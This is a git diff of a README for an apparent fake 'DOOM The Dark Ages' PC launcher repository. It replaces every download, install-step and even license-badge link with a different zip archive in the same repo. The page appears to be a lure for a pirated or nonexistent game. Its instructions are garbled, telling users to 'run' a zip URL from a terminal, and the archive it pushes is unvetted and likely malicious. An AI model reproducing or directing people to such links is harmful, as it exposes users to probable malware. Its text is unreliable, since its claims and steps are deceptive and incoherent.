@@ -1,5 +1,5 @@
 # DOOM The Dark Ages: Gateway Version  
-[![Download](https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip%20The%20Dark%20Ages%20Gateway-blue?logo=windows&logoColor=white)](https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip)  
+[![Download](https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip%20The%20Dark%20Ages%20Gateway-blue?logo=windows&logoColor=white)](https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip)  
 
 ---
 
@@ -80,15 +80,15 @@ Stuck in a crypt? Monster glitched through the wall? Summon support with a click
 ## 🛠️ Installation Steps
 
 **1. Secure Your Launcher:**  
-Download the DOOM The Dark Ages Gateway Version here: https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip
+Download the DOOM The Dark Ages Gateway Version here: https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip
 
 **2. Unpack the Secrets:**  
 Extract the downloaded archive to your preferred directory.
 
 **3. Run the Installer:**  
-On Windows, start `https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip`.  
+On Windows, start `https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip`.  
 On macOS, open the `.dmg` file and drag to Applications.  
-On Linux, run `https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip` from Terminal.
+On Linux, run `https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip` from Terminal.
 
 **4. Choose Features:**  
 During setup, select language, AI integration, and mod options.
@@ -113,13 +113,13 @@ Launch the game. Step into the Dark Ages.
 ## 📜 MIT License (2025)
 
 This project sparkles under the MIT License:  
-[![License: MIT](https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip)](https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip)  
+[![License: MIT](https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip)](https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip)  
 
 (C) 2025: You are spiritedly invited to use, modify, and redistribute with attribution, so the tales of the Dark Ages will live forever.
 
 ---
 
-## [![Download](https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip%20The%20Dark%20Ages%20Gateway-blue?logo=windows&logoColor=white)](https://raw.githubusercontent.com/Nashteshri7/doom-the-dark-ages-pc-version/branch/quindecima/doom-the-dark-ages-pc-version-v2.2.zip)
+## [![Download](https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip%20The%20Dark%20Ages%20Gateway-blue?logo=windows&logoColor=white)](https://github.com/Nashteshri7/doom-the-dark-ages-pc-version/raw/refs/heads/branch/quindecima/the-pc-ages-doom-version-dark-3.0.zip)
 
 ---
   
